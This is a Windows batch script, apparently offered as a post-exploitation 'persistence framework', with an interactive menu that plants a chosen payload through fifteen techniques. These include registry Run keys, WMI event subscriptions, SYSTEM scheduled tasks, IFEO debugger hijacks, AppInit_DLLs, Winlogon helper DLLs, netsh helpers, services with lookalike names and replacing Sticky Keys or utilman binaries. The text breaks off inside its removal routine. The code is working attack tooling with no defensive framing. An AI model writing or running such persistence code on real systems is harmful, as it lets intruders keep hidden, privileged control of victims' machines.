@echo off
chcp 65001 >nul
title Sairento-Step v2.0 - Persistence Framework
color 0E

:: ============================================================
::  Sairento-Step v2.0 - Windows Persistence Framework
::  By Eyna
:: ============================================================

:: --- Configuration ---
set "VERSION=2.0"
set "LOGFILE=%TEMP%\sairento_deployed.log"

:: --- Check Admin ---
set "IS_ADMIN=0"
net session >nul 2>&1 && set "IS_ADMIN=1"

:: ============================================================
::  MAIN MENU
:: ============================================================
:menu
cls
echo.
echo  ======================================================
echo       Sairento-Step v%VERSION% - Persistence Framework
echo                         By Eyna
echo  ======================================================
if "%IS_ADMIN%"=="1" (
    echo  [Privilege: ADMIN]
) else (
    echo  [Privilege: USER]
)
echo  ======================================================
echo.
echo  --- Deploy Persistence ---
if "%IS_ADMIN%"=="1" (
    echo   1.  Registry Runkey (HKCU^)
    echo   2.  User Environment Variable (HKCU^)
    echo   3.  ScreenSaver Registry (HKCU^)
    echo   4.  URL-File Creation
    echo   5.  Registry Werfault (HKLM^)
    echo   6.  BYO Protocol Handler (HKCU^)
    echo   7.  WMI Stealth Persistence
    echo   8.  Scheduled Task
    echo   9.  Startup Folder
    echo   10. IFEO Debugger (HKLM^)
    echo   11. AppInit_DLLs (HKLM^)
    echo   12. Service Creation (HKLM^)
    echo   13. Winlogon Helper DLL (HKLM^)
    echo   14. Netsh Helper DLL
    echo   15. Accessibility Feature Replace
) else (
    echo   1. Registry Runkey (HKCU^)
    echo   2. User Environment Variable (HKCU^)
    echo   3. ScreenSaver Registry (HKCU^)
    echo   4. URL-File Creation
    echo   6. BYO Protocol Handler (HKCU^)
    echo   8. Scheduled Task
    echo   9. Startup Folder
)
echo.
echo  --- Management ---
echo   16. View Deployed Persistence
echo   17. Remove a Persistence Entry
echo   18. Remove ALL Persistence
echo.
echo  --- Info ---
echo   19. Guides ^& Info
echo   20. Exit
echo.
echo  ======================================================
set /p "choice=  Enter your choice (1-20): "

if "%choice%"=="1" goto opt1
if "%choice%"=="2" goto opt2
if "%choice%"=="3" goto opt3
if "%choice%"=="4" goto opt4
if "%choice%"=="5" goto opt5
if "%choice%"=="6" goto opt6
if "%choice%"=="7" goto opt7
if "%choice%"=="8" goto opt8
if "%choice%"=="9" goto opt9
if "%choice%"=="10" goto opt10
if "%choice%"=="11" goto opt11
if "%choice%"=="12" goto opt12
if "%choice%"=="13" goto opt13
if "%choice%"=="14" goto opt14
if "%choice%"=="15" goto opt15
if "%choice%"=="16" goto view_deployed
if "%choice%"=="17" goto remove_entry
if "%choice%"=="18" goto remove_all
if "%choice%"=="19" goto guides
if "%choice%"=="20" goto end

echo.
echo  [!] Invalid choice. Press any key to try again...
pause >nul
goto menu


:: ============================================================
::  OPTION 1 - Registry Runkey (HKCU)
:: ============================================================
:opt1
cls
echo.
echo  --- Registry Runkey (HKCU) ---
echo  Creates a Run key that executes on user logon.
echo  ======================================================
echo.

:get_opt1_name
set "RNAME="
set /p "RNAME=  Enter registry value name: "
if not defined RNAME (
    echo  [!] Name cannot be empty.
    goto get_opt1_name
)

:get_opt1_path
set "EPATH="
set /p "EPATH=  Enter full path to payload executable: "
if not defined EPATH goto opt1
if not exist "%EPATH%" (
    echo  [!] File not found: "%EPATH%"
    goto get_opt1_path
)

echo.
echo  [*] Adding registry key...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%RNAME%" /t REG_SZ /d "%EPATH%" /f >nul 2>&1
if %errorlevel% neq 0 (
    echo  [X] Failed to add registry key.
    pause
    goto menu
)

echo  [*] Verifying...
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%RNAME%" >nul 2>&1
if %errorlevel% equ 0 (
    echo  [+] Registry Runkey created successfully!
    call :log_entry "Registry Runkey (HKCU)" "HKCU\...\Run\%RNAME%"
) else (
    echo  [X] Verification failed. Key may not have been created.
)

echo.
echo  Press any key to return to menu...
pause >nul
goto menu


:: ============================================================
::  OPTION 2 - User Environment Variable (HKCU)
:: ============================================================
:opt2
cls
echo.
echo  --- User Environment Variable (HKCU) ---
echo  Sets a user environment variable. Can be triggered by startup
echo  scripts or applications that read environment variables.
echo  ======================================================
echo.

:get_opt2_name
set "RNAME="
set /p "RNAME=  Enter variable name: "
if not defined RNAME (
    echo  [!] Name cannot be empty.
    goto get_opt2_name
)

:get_opt2_path
set "EPATH="
set /p "EPATH=  Enter full path to payload: "
if not defined EPATH goto opt2

echo.
echo  [*] Adding environment variable...
reg add "HKCU\Environment" /v "%RNAME%" /t REG_SZ /d "%EPATH%" /f >nul 2>&1
if %errorlevel% neq 0 (
    echo  [X] Failed to add environment variable.
    pause
    goto menu
)

echo  [*] Verifying...
reg query "HKCU\Environment" /v "%RNAME%" >nul 2>&1
if %errorlevel% equ 0 (
    echo  [+] Environment variable created successfully!
    call :log_entry "User Environment Variable (HKCU)" "HKCU\Environment\%RNAME%"
) else (
    echo  [X] Verification failed.
)

echo.
echo  Press any key to return to menu...
pause >nul
goto menu


:: ============================================================
::  OPTION 3 - ScreenSaver Registry (HKCU)
:: ============================================================
:opt3
cls
setlocal EnableDelayedExpansion
echo.
echo  --- ScreenSaver Registry (HKCU) ---
echo  Sets a custom screensaver (.scr) that executes on idle.
echo  Payload MUST be a .scr file.
echo  ======================================================
echo.

:get_opt3_path
set "EPATH="
set /p "EPATH=  Enter full path to .scr payload: "
if not defined EPATH goto opt3
if not exist "%EPATH%" (
    echo  [!] File not found: "%EPATH%"
    goto get_opt3_path
)

:: Check .scr extension
set "EXT=%EPATH:~-4%"
if /i not "%EXT%"==".scr" (
    echo  [!] Warning: File does not have .scr extension.
    echo  [!] Windows screensaver system only auto-executes .scr files.
    set /p "CONT=  Continue anyway? (y/n): "
    if /i not "!CONT!"=="y" goto opt3
)

echo.
echo  [*] Configuring screensaver settings...
reg add "HKCU\Control Panel\Desktop" /v "ScreenSaveActive" /t REG_SZ /d "1" /f >nul 2>&1
reg add "HKCU\Control Panel\Desktop" /v "ScreenSaveIsSecure" /t REG_SZ /d "0" /f >nul 2>&1
reg add "HKCU\Control Panel\Desktop" /v "SCRNSAVE.EXE" /t REG_SZ /d "%EPATH%" /f >nul 2>&1
reg add "HKCU\Control Panel\Desktop" /v "ScreenSaveTimeOut" /t REG_SZ /d "10" /f >nul 2>&1

if %errorlevel% neq 0 (
    echo  [X] Failed to configure screensaver registry.
    pause
    goto menu
)

echo  [*] Verifying...
reg query "HKCU\Control Panel\Desktop" /v "SCRNSAVE.EXE" >nul 2>&1
if %errorlevel% equ 0 (
    echo  [+] ScreenSaver persistence configured successfully!
    call :log_entry "ScreenSaver Registry (HKCU)" "HKCU\Control Panel\Desktop\SCRNSAVE.EXE"
) else (
    echo  [X] Verification failed.
)

echo.
echo  Press any key to return to menu...
pause >nul
endlocal
goto menu


:: ============================================================
::  OPTION 4 - URL-File Creation
:: ============================================================
:opt4
cls
setlocal EnableDelayedExpansion
echo.
echo  --- URL-File Creation ---
echo  Creates a .url shortcut file that opens a target URL or file.
echo  Use: rundll32 url.dll,OpenURL "C:\path\file.url" to execute.
echo  ======================================================
echo.

:get_opt4_url
set "TARGET="
set /p "TARGET=  Enter target URL or file path (e.g. C:\payload.exe or http://...): "
if not defined TARGET goto opt4

:get_opt4_save
set "SAVEPATH="
set /p "SAVEPATH=  Enter path to save .url file (e.g. C:\Windows\Temp\shortcut.url): "
if not defined SAVEPATH goto opt4

:: Create parent directory if needed
for %%i in ("%SAVEPATH%") do mkdir "%%~dpi" 2>nul

echo.
echo  [*] Creating URL file...

:: Convert backslashes to forward slashes for file:// URI
set "TARGET_URL=!TARGET:\=/!"

(
    echo [InternetShortcut]
    echo URL=%TARGET_URL%
) > "%SAVEPATH%" 2>&1

if exist "%SAVEPATH%" (
    echo  [+] URL file created: %SAVEPATH%
    echo  [*] To execute: rundll32 url.dll,OpenURL "%SAVEPATH%"
    call :log_entry "URL-File Creation" "%SAVEPATH%"
) else (
    echo  [X] Failed to create URL file.
)

echo.
echo  Press any key to return to menu...
pause >nul
endlocal
goto menu


:: ============================================================
::  OPTION 5 - Registry Werfault (Admin - HKLM)
:: ============================================================
:opt5
cls
if "%IS_ADMIN%"=="0" (
    echo.
    echo  [X] This technique requires Administrator privileges.
    echo  [X] Please run this script as Administrator.
    echo.
    pause
    goto menu
)

echo.
echo  --- Registry Werfault (Admin - HKLM) ---
echo  Sets ReflectDebugger for Windows Error Reporting.
echo  Trigger: werfault.exe -pr 4
echo  ======================================================
echo.

:get_opt5_path
set "EPATH="
set /p "EPATH=  Enter path to payload executable: "
if not defined EPATH goto opt5
if not exist "%EPATH%" (
    echo  [!] File not found: "%EPATH%"
    goto get_opt5_path
)

echo.
echo  [*] Adding Werfault registry key...
reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\Hangs" /v "ReflectDebugger" /t REG_SZ /d "%EPATH%" /f >nul 2>&1
if %errorlevel% neq 0 (
    echo  [X] Failed to add registry key. Ensure you have admin rights.
    pause
    goto menu
)

echo  [*] Verifying...
reg query "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\Hangs" /v "ReflectDebugger" >nul 2>&1
if %errorlevel% equ 0 (
    echo  [+] Werfault persistence configured successfully!
    echo  [*] Trigger with: werfault.exe -pr 4
    call :log_entry "Registry Werfault (HKLM)" "HKLM\...\Werfault\ReflectDebugger"
) else (
    echo  [X] Verification failed.
)

echo.
echo  Press any key to return to menu...
pause >nul
goto menu


:: ============================================================
::  OPTION 6 - BYO Protocol Handler + URL-File (HKCU)
:: ============================================================
:opt6
cls
echo.
echo  --- BYO Protocol Handler + URL-File (HKCU) ---
echo  Registers a custom protocol handler and creates a .url file.
echo  Clicking the .url file executes your payload.
echo  ======================================================
echo.

:get_opt6_regname
set "REGNAME="
set /p "REGNAME=  Enter protocol handler name (letters/numbers/-/_ only): "
if not defined REGNAME goto menu
echo %REGNAME%| findstr /r "^[a-zA-Z0-9][a-zA-Z0-9_-]*$" >nul || (
    echo  [!] Invalid name. Use only letters, numbers, dash or underscore.
    goto get_opt6_regname
)

:get_opt6_payload
set "EPATH="
set /p "EPATH=  Enter full path to payload executable: "
if not defined EPATH goto menu
if not exist "%EPATH%" (
    echo  [!] File not found: "%EPATH%"
    goto get_opt6_payload
)

:get_opt6_save
set "SAVEPATH="
set /p "SAVEPATH=  Enter path to save .url file (e.g. C:\Test.url): "
if not defined SAVEPATH goto menu

:: Create parent directory if needed
for %%i in ("%SAVEPATH%") do mkdir "%%~dpi" 2>nul

echo.
echo  [*] Registering protocol handler...

reg add "HKCU\Software\Classes\%REGNAME%" /ve /t REG_SZ /d "URL:%REGNAME% Protocol" /f >nul 2>&1
reg add "HKCU\Software\Classes\%REGNAME%" /v "URL Protocol" /t REG_SZ /d "" /f >nul 2>&1
reg add "HKCU\Software\Classes\%REGNAME%\shell\open\command" /ve /t REG_SZ /d "\"%EPATH%\" \"%%1\"" /f >nul 2>&1

if %errorlevel% neq 0 (
    echo  [X] Failed to register protocol handler.
    pause
    goto menu
)

echo  [*] Verifying registry...
reg query "HKCU\Software\Classes\%REGNAME%\shell\open\command" /ve >nul 2>&1
if %errorlevel% neq 0 (
    echo  [X] Verification failed.
    pause
    goto menu
)

echo  [*] Creating URL file...
(
    echo [InternetShortcut]
    echo URL=%REGNAME%://
) > "%SAVEPATH%" 2>&1

if exist "%SAVEPATH%" (
    echo  [+] Protocol handler registered: %REGNAME%://
    echo  [+] URL file created: %SAVEPATH%
    echo  [*] Test with: rundll32 url.dll,OpenURL "%SAVEPATH%"
    call :log_entry "BYO Protocol Handler (HKCU)" "HKCU\...\Classes\%REGNAME%"
) else (
    echo  [X] Failed to create URL file.
)

echo.
echo  Press any key to return to menu...
pause >nul
goto menu


:: ============================================================
::  OPTION 7 - WMI Stealth Persistence (Admin)
:: ============================================================
:opt7
cls
if "%IS_ADMIN%"=="0" (
    echo.
    echo  [X] This technique requires Administrator privileges.
    echo  [X] Please run this script as Administrator.
    echo.
    pause
    goto menu
)

echo.
echo  --- WMI Stealth Persistence (Admin) ---
echo  Creates a WMI event subscription that runs payload on interval.
echo  Requires: Administrator privileges.
echo  ======================================================
echo.

:get_opt7_name
set "WNAME="
set /p "WNAME=  Enter WMI object name: "
if not defined WNAME (
    echo  [!] Name cannot be empty.
    goto get_opt7_name
)

:get_opt7_path
set "EPATH="
set /p "EPATH=  Enter full path to payload executable: "
if not defined EPATH goto opt7
if not exist "%EPATH%" (
    echo  [!] File not found: "%EPATH%"
    goto get_opt7_path
)

:get_opt7_delay
set "DELAY="
set /p "DELAY=  Enter execution interval in minutes: "
if not defined DELAY goto opt7
set /a "DELAY_SEC=%DELAY% * 60" 2>nul
if %DELAY_SEC% leq 0 (
    echo  [!] Invalid delay. Must be a positive number.
    goto get_opt7_delay
)

echo.
echo  [*] Creating WMI Event Filter...
wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="%WNAME%", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN %DELAY_SEC% WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'" >nul 2>&1
if %errorlevel% neq 0 (
    echo  [X] Failed to create Event Filter.
    pause
    goto menu
)

echo  [*] Creating CommandLineEventConsumer...
wmic /namespace:\\root\subscription PATH CommandLineEventConsumer CREATE Name="%WNAME%", CommandLineTemplate="%EPATH%" >nul 2>&1
if %errorlevel% neq 0 (
    echo  [X] Failed to create Consumer. Cleaning up filter...
    wmic /namespace:\\root\subscription PATH __EventFilter WHERE Name="%WNAME%" DELETE >nul 2>&1
    pause
    goto menu
)

echo  [*] Creating Filter-to-Consumer Binding...
wmic /namespace:\\root\subscription PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"%WNAME%\"", Consumer="CommandLineEventConsumer.Name=\"%WNAME%\"" >nul 2>&1
if %errorlevel% neq 0 (
    echo  [X] Failed to create Binding. Cleaning up...
    wmic /namespace:\\root\subscription PATH __EventFilter WHERE Name="%WNAME%" DELETE >nul 2>&1
    wmic /namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="%WNAME%" DELETE >nul 2>&1
    pause
    goto menu
)

echo  [+] WMI Stealth Persistence configured successfully!
echo  [*] Object Name: %WNAME%
echo  [*] Interval: %DELAY% minutes
call :log_entry "WMI Stealth Persistence" "WMI\%WNAME%"

echo.
echo  Press any key to return to menu...
pause >nul
goto menu


:: ============================================================
::  OPTION 8 - Scheduled Task
:: ============================================================
:opt8
cls
echo.
echo  --- Scheduled Task ---
echo  Creates a scheduled task that runs at logon.
echo  [Both] User-level by default, SYSTEM-level with admin.
echo  ======================================================
echo.

:get_opt8_name
set "TNAME="
set /p "TNAME=  Enter task name: "
if not defined TNAME (
    echo  [!] Name cannot be empty.
    goto get_opt8_name
)

:get_opt8_path
set "EPATH="
set /p "EPATH=  Enter full path to payload executable: "
if not defined EPATH goto opt8
if not exist "%EPATH%" (
    echo  [!] File not found: "%EPATH%"
    goto get_opt8_path
)

set "RUNAS="
if "%IS_ADMIN%"=="1" (
    set /p "RUNAS=  Run as SYSTEM? (y/n, default n): "
)

echo.
if /i "%RUNAS%"=="y" (
    echo  [*] Creating SYSTEM-level scheduled task...
    schtasks /create /tn "%TNAME%" /tr "\"%EPATH%\"" /sc onlogon /ru SYSTEM /rl HIGHEST /f >nul 2>&1
) else (
    echo  [*] Creating user-level scheduled task...
    schtasks /create /tn "%TNAME%" /tr "\"%EPATH%\"" /sc onlogon /f >nul 2>&1
)

if %errorlevel% neq 0 (
    echo  [X] Failed to create scheduled task.
    pause
    goto menu
)

echo  [*] Verifying...
schtasks /query /tn "%TNAME%" >nul 2>&1
if %errorlevel% equ 0 (
    echo  [+] Scheduled Task created successfully!
    call :log_entry "Scheduled Task" "Task:%TNAME%"
) else (
    echo  [X] Verification failed.
)

echo.
echo  Press any key to return to menu...
pause >nul
goto menu


:: ============================================================
::  OPTION 9 - Startup Folder (HKCU)
:: ============================================================
:opt9
cls
echo.
echo  --- Startup Folder (HKCU) ---
echo  Copies a payload to the user's Startup folder.
echo  Executes automatically on user logon.
echo  ======================================================
echo.

:get_opt9_path
set "EPATH="
set /p "EPATH=  Enter full path to payload file: "
if not defined EPATH goto opt9
if not exist "%EPATH%" (
    echo  [!] File not found: "%EPATH%"
    goto get_opt9_path
)

:get_opt9_name
set "FNAME="
set /p "FNAME=  Enter filename for Startup folder (e.g. update.exe): "
if not defined FNAME goto opt9

set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

echo.
echo  [*] Copying payload to Startup folder...
copy /y "%EPATH%" "%STARTUP%\%FNAME%" >nul 2>&1
if %errorlevel% neq 0 (
    echo  [X] Failed to copy file to Startup folder.
    pause
    goto menu
)

if exist "%STARTUP%\%FNAME%" (
    echo  [+] Startup folder persistence created!
    echo  [*] Location: %STARTUP%\%FNAME%
    call :log_entry "Startup Folder (HKCU)" "%STARTUP%\%FNAME%"
) else (
    echo  [X] File copy verification failed.
)

echo.
echo  Press any key to return to menu...
pause >nul
goto menu


:: ============================================================
::  OPTION 10 - IFEO Debugger (Admin - HKLM)
:: ============================================================
:opt10
cls
if "%IS_ADMIN%"=="0" (
    echo.
    echo  [X] This technique requires Administrator privileges.
    echo  [X] Please run this script as Administrator.
    echo.
    pause
    goto menu
)

echo.
echo  --- IFEO Debugger (Admin - HKLM) ---
echo  Hijacks execution of a target executable via debugger.
echo  Common targets: sethc.exe, utilman.exe, osk.exe, narrator.exe
echo  ======================================================
echo.

:get_opt10_target
set "TARGET="
set /p "TARGET=  Enter target executable to hijack (e.g. sethc.exe): "
if not defined TARGET goto opt10

:get_opt10_path
set "EPATH="
set /p "EPATH=  Enter path to payload executable: "
if not defined EPATH goto opt10
if not exist "%EPATH%" (
    echo  [!] File not found: "%EPATH%"
    goto get_opt10_path
)

echo.
echo  [*] Adding IFEO Debugger key...
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%TARGET%" /v "Debugger" /t REG_SZ /d "\"%EPATH%\"" /f >nul 2>&1
if %errorlevel% neq 0 (
    echo  [X] Failed to add IFEO key. Ensure you have admin rights.
    pause
    goto menu
)

echo  [*] Verifying...
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%TARGET%" /v "Debugger" >nul 2>&1
if %errorlevel% equ 0 (
    echo  [+] IFEO Debugger persistence configured!
    echo  [*] When %TARGET% is executed, it will run: %EPATH%
    call :log_entry "IFEO Debugger (HKLM)" "HKLM\...\IFEO\%TARGET%\Debugger"
) else (
    echo  [X] Verification failed.
)

echo.
echo  Press any key to return to menu...
pause >nul
goto menu


:: ============================================================
::  OPTION 11 - AppInit_DLLs (Admin - HKLM)
:: ============================================================
:opt11
cls
if "%IS_ADMIN%"=="0" (
    echo.
    echo  [X] This technique requires Administrator privileges.
    echo  [X] Please run this script as Administrator.
    echo.
    pause
    goto menu
)

echo.
echo  --- AppInit_DLLs (Admin - HKLM) ---
echo  Loads a DLL into every process that loads user32.dll.
echo  Requires: Admin + LoadAppInit_DLLs=1
echo  ======================================================
echo.

:get_opt11_path
set "EPATH="
set /p "EPATH=  Enter full path to payload DLL: "
if not defined EPATH goto opt11
if not exist "%EPATH%" (
    echo  [!] File not found: "%EPATH%"
    goto get_opt11_path
)

echo.
echo  [*] Enabling AppInit_DLLs...
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v "LoadAppInit_DLLs" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v "AppInit_DLLs" /t REG_SZ /d "%EPATH%" /f >nul 2>&1

if %errorlevel% neq 0 (
    echo  [X] Failed to configure AppInit_DLLs. Ensure admin rights.
    pause
    goto menu
)

echo  [*] Verifying...
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v "LoadAppInit_DLLs" >nul 2>&1
if %errorlevel% equ 0 (
    echo  [+] AppInit_DLLs persistence configured!
    echo  [*] DLL will load into all user32.dll processes on next boot.
    call :log_entry "AppInit_DLLs (HKLM)" "HKLM\...\Windows\AppInit_DLLs"
) else (
    echo  [X] Verification failed.
)

echo.
echo  Press any key to return to menu...
pause >nul
goto menu


:: ============================================================
::  OPTION 12 - Service Creation (Admin - HKLM)
:: ============================================================
:opt12
cls
if "%IS_ADMIN%"=="0" (
    echo.
    echo  [X] This technique requires Administrator privileges.
    echo  [X] Please run this script as Administrator.
    echo.
    pause
    goto menu
)

echo.
echo  --- Service Creation (Admin - HKLM) ---
echo  Creates a Windows service that auto-starts with the system.
echo  ======================================================
echo.

:get_opt12_name
set "SNAME="
set /p "SNAME=  Enter service name: "
if not defined SNAME (
    echo  [!] Name cannot be empty.
    goto get_opt12_name
)

:get_opt12_display
set "DNAME="
set /p "DNAME=  Enter display name (e.g. Windows Update Service): "
if not defined DNAME set "DNAME=%SNAME%"

:get_opt12_path
set "EPATH="
set /p "EPATH=  Enter full path to payload executable: "
if not defined EPATH goto opt12
if not exist "%EPATH%" (
    echo  [!] File not found: "%EPATH%"
    goto get_opt12_path
)

echo.
echo  [*] Creating service...
sc create "%SNAME%" binPath= "\"%EPATH%\"" start= auto DisplayName= "%DNAME%" >nul 2>&1
if %errorlevel% neq 0 (
    echo  [X] Failed to create service. Ensure admin rights.
    pause
    goto menu
)

echo  [*] Verifying...
sc qc "%SNAME%" >nul 2>&1
if %errorlevel% equ 0 (
    echo  [+] Service created successfully!
    echo  [*] Service Name: %SNAME%
    echo  [*] Display Name: %DNAME%
    call :log_entry "Service Creation (HKLM)" "Service:%SNAME%"
) else (
    echo  [X] Verification failed.
)

echo.
echo  Press any key to return to menu...
pause >nul
goto menu


:: ============================================================
::  OPTION 13 - Winlogon Helper DLL (Admin - HKLM)
:: ============================================================
:opt13
cls
if "%IS_ADMIN%"=="0" (
    echo.
    echo  [X] This technique requires Administrator privileges.
    echo  [X] Please run this script as Administrator.
    echo.
    pause
    goto menu
)

echo.
echo  --- Winlogon Helper DLL (Admin - HKLM) ---
echo  Registers a DLL loaded by Winlogon on logon/logoff events.
echo  ======================================================
echo.

:get_opt13_name
set "WNAME="
set /p "WNAME=  Enter registry key name: "
if not defined WNAME (
    echo  [!] Name cannot be empty.
    goto get_opt13_name
)

:get_opt13_path
set "EPATH="
set /p "EPATH=  Enter full path to payload DLL: "
if not defined EPATH goto opt13
if not exist "%EPATH%" (
    echo  [!] File not found: "%EPATH%"
    goto get_opt13_path
)

echo.
echo  [*] Registering Winlogon Helper DLL...
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\%WNAME%" /v "DLLName" /t REG_SZ /d "%EPATH%" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\%WNAME%" /v "Logon" /t REG_SZ /d "WinlogonLogonEvent" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\%WNAME%" /v "Logoff" /t REG_SZ /d "WinlogonLogoffEvent" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\%WNAME%" /v "Shell" /t REG_SZ /d "1" /f >nul 2>&1

if %errorlevel% neq 0 (
    echo  [X] Failed to register Winlogon Helper DLL.
    pause
    goto menu
)

echo  [*] Verifying...
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\%WNAME%" /v "DLLName" >nul 2>&1
if %errorlevel% equ 0 (
    echo  [+] Winlogon Helper DLL registered!
    echo  [*] DLL will load on logon/logoff events.
    call :log_entry "Winlogon Helper DLL (HKLM)" "HKLM\...\Winlogon\Notify\%WNAME%"
) else (
    echo  [X] Verification failed.
)

echo.
echo  Press any key to return to menu...
pause >nul
goto menu


:: ============================================================
::  OPTION 14 - Netsh Helper DLL (Admin)
:: ============================================================
:opt14
cls
if "%IS_ADMIN%"=="0" (
    echo.
    echo  [X] This technique requires Administrator privileges.
    echo  [X] Please run this script as Administrator.
    echo.
    pause
    goto menu
)

echo.
echo  --- Netsh Helper DLL (Admin) ---
echo  Registers a DLL helper for netsh. Loads when netsh is invoked.
echo  ======================================================
echo.

:get_opt14_path
set "EPATH="
set /p "EPATH=  Enter full path to payload DLL: "
if not defined EPATH goto opt14
if not exist "%EPATH%" (
    echo  [!] File not found: "%EPATH%"
    goto get_opt14_path
)

echo.
echo  [*] Registering netsh helper...
netsh add helper "%EPATH%" >nul 2>&1
if %errorlevel% neq 0 (
    echo  [X] Failed to add netsh helper. Ensure admin rights.
    pause
    goto menu
)

echo  [+] Netsh Helper DLL registered!
echo  [*] DLL will load when netsh.exe is executed.
call :log_entry "Netsh Helper DLL" "netsh helper:%EPATH%"

echo.
echo  Press any key to return to menu...
pause >nul
goto menu


:: ============================================================
::  OPTION 15 - Accessibility Feature Replace (Admin - HKLM)
:: ============================================================
:opt15
cls
if "%IS_ADMIN%"=="0" (
    echo.
    echo  [X] This technique requires Administrator privileges.
    echo  [X] Please run this script as Administrator.
    echo.
    pause
    goto menu
)

echo.
echo  --- Accessibility Feature Replace (Admin - HKLM) ---
echo  Replaces an accessibility executable with your payload.
echo  Targets: sethc.exe (Sticky Keys), utilman.exe, osk.exe, narrator.exe
echo  ======================================================
echo.
echo  Available targets:
echo    1. sethc.exe     (Sticky Keys - Shift x5)
echo    2. utilman.exe   (Ease of Access)
echo    3. osk.exe       (On-Screen Keyboard)
echo    4. narrator.exe  (Narrator)
echo    5. magnify.exe   (Magnifier)
echo    6. displayswitch.exe (Display Switch)
echo.
set /p "TARGET=  Select target (1-6): "

if "%TARGET%"=="1" set "TARGET=sethc.exe"
if "%TARGET%"=="2" set "TARGET=utilman.exe"
if "%TARGET%"=="3" set "TARGET=osk.exe"
if "%TARGET%"=="4" set "TARGET=narrator.exe"
if "%TARGET%"=="5" set "TARGET=magnify.exe"
if "%TARGET%"=="6" set "TARGET=displayswitch.exe"

if not defined TARGET (
    echo  [!] Invalid selection.
    pause
    goto menu
)

:get_opt15_path
set "EPATH="
set /p "EPATH=  Enter path to payload executable: "
if not defined EPATH goto opt15
if not exist "%EPATH%" (
    echo  [!] File not found: "%EPATH%"
    goto get_opt15_path
)

set "SYS32=%WINDIR%\System32"

echo.
echo  [*] Backing up original: %SYS32%\%TARGET%
copy /y "%SYS32%\%TARGET%" "%SYS32%\%TARGET%.bak" >nul 2>&1

echo  [*] Replacing %TARGET%...
copy /y "%EPATH%" "%SYS32%\%TARGET%" >nul 2>&1
if %errorlevel% neq 0 (
    echo  [X] Failed to replace file. Ensure admin rights.
    echo  [*] Restoring backup...
    copy /y "%SYS32%\%TARGET%.bak" "%SYS32%\%TARGET%" >nul 2>&1
    pause
    goto menu
)

if exist "%SYS32%\%TARGET%" (
    echo  [+] Accessibility feature replaced!
    echo  [*] Original backed up to: %SYS32%\%TARGET%.bak
    echo  [*] Trigger: Press Shift x5 (for sethc) or launch %TARGET%
    call :log_entry "Accessibility Feature Replace" "%SYS32%\%TARGET%"
) else (
    echo  [X] Replacement verification failed.
)

echo.
echo  Press any key to return to menu...
pause >nul
goto menu


:: ============================================================
::  VIEW DEPLOYED PERSISTENCE
:: ============================================================
:view_deployed
cls
echo.
echo  --- Deployed Persistence ---
echo  ======================================================
echo.

if not exist "%LOGFILE%" (
    echo  [!] No persistence entries found.
    echo  [*] Deploy some persistence first, then check here.
    echo.
    pause
    goto menu
)

echo  Timestamp                      ^| Technique                     ^| Details
echo  -------------------------------+-------------------------------+--------
type "%LOGFILE%"
echo.
echo  ======================================================

echo.
echo  Press any key to return to menu...
pause >nul
goto menu


:: ============================================================
::  REMOVE A PERSISTENCE ENTRY
:: ============================================================
:remove_entry
cls
echo.
echo  --- Remove Persistence Entry ---
echo  ======================================================
echo.
if "%IS_ADMIN%"=="1" (
    echo  Select technique to remove:
    echo   1.  Registry Runkey (HKCU^)
    echo   2.  User Environment Variable (HKCU^)
    echo   3.  ScreenSaver Registry (HKCU^)
    echo   4.  URL-File (delete file^)
    echo   5.  Registry Werfault (HKLM^)
    echo   6.  BYO Protocol Handler (HKCU^)
    echo   7.  WMI Stealth Persistence
    echo   8.  Scheduled Task
    echo   9.  Startup Folder entry
    echo   10. IFEO Debugger (HKLM^)
    echo   11. AppInit_DLLs (HKLM^)
    echo   12. Service
    echo   13. Winlogon Helper DLL (HKLM^)
    echo   14. Netsh Helper DLL
    echo   15. Accessibility Feature (restore backup^)
) else (
    echo  Select technique to remove:
    echo   1. Registry Runkey (HKCU^)
    echo   2. User Environment Variable (HKCU^)
    echo   3. ScreenSaver Registry (HKCU^)
    echo   4. URL-File (delete file^)
    echo   6. BYO Protocol Handler (HKCU^)
    echo   8. Scheduled Task
    echo   9. Startup Folder entry
)
echo.
set /p "RCHOICE=  Select technique to remove: "

if "%RCHOICE%"=="1" goto rem_opt1
if "%RCHOICE%"=="2" goto rem_opt2
if "%RCHOICE%"=="3" goto rem_opt3
if "%RCHOICE%"=="4" goto rem_opt4
if "%RCHOICE%"=="5" goto rem_opt5
if "%RCHOICE%"=="6" goto rem_opt6
if "%RCHOICE%"=="7" goto rem_opt7
if "%RCHOICE%"=="8" goto rem_opt8
if "%RCHOICE%"=="9" goto rem_opt9
if "%RCHOICE%"=="10" goto rem_opt10
if "%RCHOICE%"=="11" goto rem_opt11
if "%RCHOICE%"=="12" goto rem_opt12
if "%RCHOICE%"=="13" goto rem_opt13
if "%RCHOICE%"=="14" goto rem_opt14
if "%RCHOICE%"=="15" goto rem_opt15

echo  [!] Invalid choice.
pause
goto menu

:rem_opt1
set "RNAME="
set /p "RNAME=  Enter registry value name to remove: "
